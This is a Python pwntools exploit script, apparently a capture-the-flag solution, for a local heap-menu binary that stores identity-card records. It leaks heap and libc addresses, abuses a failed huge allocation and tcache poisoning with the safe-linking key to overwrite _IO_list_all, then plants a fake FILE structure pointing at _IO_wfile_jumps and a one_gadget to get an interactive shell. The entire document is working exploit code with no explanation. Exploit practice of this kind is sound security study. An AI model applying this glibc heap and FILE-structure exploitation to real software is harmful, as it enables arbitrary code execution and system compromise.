from pwn import *

r=process("./pwn")
#
def add_(num,name,size,payload):
	r.recvuntil(b"5. Exit\n>")
	r.sendline(b"1")
	r.recvuntil(b"Identity Card Number: \n>")
	r.sendline(str(num))
	r.recvuntil(b"Name: \n>")
	r.sendline(name)
	r.recvuntil(b"Size:\n>")
	r.sendline(str(size))
	r.recvuntil(b">")
	r.send(payload)
	return

def edi_(index,num,name,size,payload):
	r.recvuntil(b"5. Exit\n>")
	r.sendline(b"3")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))
	r.recvuntil(b"Identity Card Number: \n>")
	r.sendline(str(num))
	r.recvuntil(b"Name: \n>")
	r.sendline(name)
	r.recvuntil(b"Size:\n>")
	r.sendline(str(size))
	r.recvuntil(b">")
	r.send(payload)
	return

def del_(index):
	r.recvuntil(b"5. Exit\n>")
	r.sendline(b"2")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))

def show_(index):
	r.recvuntil(b"5. Exit\n>")
	r.sendline(b"4")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))

pause()
add_(0,b'a',0x18,b'a')
add_(0,b'a',0x18,b'a')

del_(0)
edi_(0,0,b'a',0x28,b'a')
add_(0,b'a',0x18,b'a'*0x10)
show_(1)
r.recvuntil(b'Information: aaaaaaaaaaaaaaaa')
heap_add=u64(r.recv(6).ljust(8,b'\x00'))
print(hex(heap_add))


add_(0,b'a',0x78,b'a')#2
add_(0,b'a',0x78,b'a')
add_(0,b'a',0x78,b'a')
add_(0,b'a',0x78,b'a')
add_(0,b'a',0x78,b'a')
add_(0,b'a',0x78,b'a')
add_(0,b'a',0x78,b'a')#8

add_(0,b'a',0x18,b'a')#9
del_(9)

add_(0,b'a',0x78,b'a')
add_(0,b'a',0x78,b'a')

add_(0,b'a',0x18,b'a')

del_(2)
del_(2)
del_(2)
del_(2)
del_(2)
del_(2)
del_(2)



del_(3)
del_(2)


add_(0,b'a',0x78,b'a')
add_(0,b'a',0x78,b'a')
add_(0,b'a',0x78,b'a')
add_(0,b'a',0x78,b'a')
add_(0,b'a',0x78,b'a')
add_(0,b'a',0x78,b'a')
add_(0,b'a',0x78,b'a')


add_(0,b'b',0x68,b'b')
add_(0,b'a',0x88,b'a'*0x8)

show_(11)

r.recvuntil(b"Information: aaaaaaaa")
libc_base=u64(r.recv(6).ljust(8,b'\x00'))-0x21ACE0
print(hex(libc_base))


libc=ELF("./libc.so.6")
io_add=libc_base+libc.sym["_IO_list_all"]#-0x23 has 7f

add_(0,b'a',0x60,b'c')#12
add_(0,b'a',0x60,b'a')
add_(0,b'a',0x60,b'a')
add_(0,b'a',0x60,b'a')
add_(0,b'a',0x60,b'a')
add_(0,b'a',0x60,b'a')
add_(0,b'a',0x60,b'a')
add_(0,b'd',0x60,b'd')
add_(0,b'a',0x60,b'a')

del_(12)
del_(12)
del_(12)
del_(12)
del_(12)
del_(12)
del_(12)
del_(12)
del_(12)

chunk_add0=heap_add+0xC50

r.recvuntil(b"5. Exit\n>")
r.sendline(b"1")
r.recvuntil(b"Identity Card Number: \n>")
r.sendline(str(0))
r.recvuntil(b"Name: \n>")
r.sendline(b'a')

context.log_level='debug'
r.recvuntil(b"Size:\n>")

r.sendline(str(4294967000))
pause()
r.recvuntil("Memory allocation failed.")
r.sendline(hex(chunk_add0))
#0x5557a4aed2d0
#0x5557a4aedf20
key=(heap_add+0xC50)//0x1000

add_(0,b'a',0x60,b'a')
add_(0,b'a',0x60,b'a')
add_(0,b'a',0x60,b'a')
add_(0,b'a',0x60,b'a')
add_(0,b'a',0x60,b'a')
add_(0,b'a',0x60,b'a')
add_(0,b'a',0x60,b'a')

add_(0,p64(io_add^key),0x60,b'a')
add_(0,b'a',0x60,b'a')
add_(0,b'a',0x60,b'a')
add_(0,p64(heap_add+0xDE0+0x30+0x10),0x60,b'\x00')

_IO_stdfile_2_lock=libc_base+0x21CA60
system=libc.sym["system"]+libc_base
#_IO_wfile_overflow
onegadget=libc_base+0xebc81
file_addr=heap_add+0xDE0+0x30+0x10#这里用的不是large_bin_attack，所以可以控制写进去的地址不是chunk_add而是chunk_add+0x10,便于控制flag为  sh
IO_wide_data_addr=file_addr
wide_vtable_addr=file_addr+0xe8-0x68
fake_io = b""
fake_io += p64(0)  # _IO_read_end
fake_io += p64(0)  # _IO_read_base
fake_io += p64(0)  # _IO_write_base
fake_io += p64(1)  # _IO_write_ptr
fake_io += p64(0)  # _IO_write_end
fake_io += p64(0)  # _IO_buf_base;
fake_io += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
fake_io += p64(0)   # _IO_save_base 
fake_io += p64(0)*3   # from _IO_backup_base to _markers
fake_io += p64(0)  # the FILE chain ptr
fake_io += p32(2)  # _fileno for stderr is 2
fake_io += p32(0)  # _flags2, usually 0
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
fake_io += p16(0)  # _cur_column
fake_io += b"\x00"  # _vtable_offset
fake_io += b"\n"  # _shortbuf[1]
fake_io += p32(0)  # padding
fake_io += p64(_IO_stdfile_2_lock)  # _IO_stdfile_1_lock
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
fake_io += p64(0)  # _codecvt, usually 0
fake_io += p64(IO_wide_data_addr)  # _IO_wide_data_1
fake_io += p64(0) * 3  # from _freeres_list to __pad5
fake_io += p32(0xFFFFFFFF)  # _mode, usually -1
fake_io += b"\x00" * 19  # _unused2
fake_io = fake_io.ljust(0xc8, b'\x00')  # adjust to vtable
fake_io += p64(libc_base+libc.sym['_IO_wfile_jumps'])  # _IO_list_all fake vtable
fake_io += p64(wide_vtable_addr)
fake_io += p64(onegadget)
fake_io =p64(0)+fake_io
add_(0,b"\x00"*8,0x300,fake_io)

r.interactive()

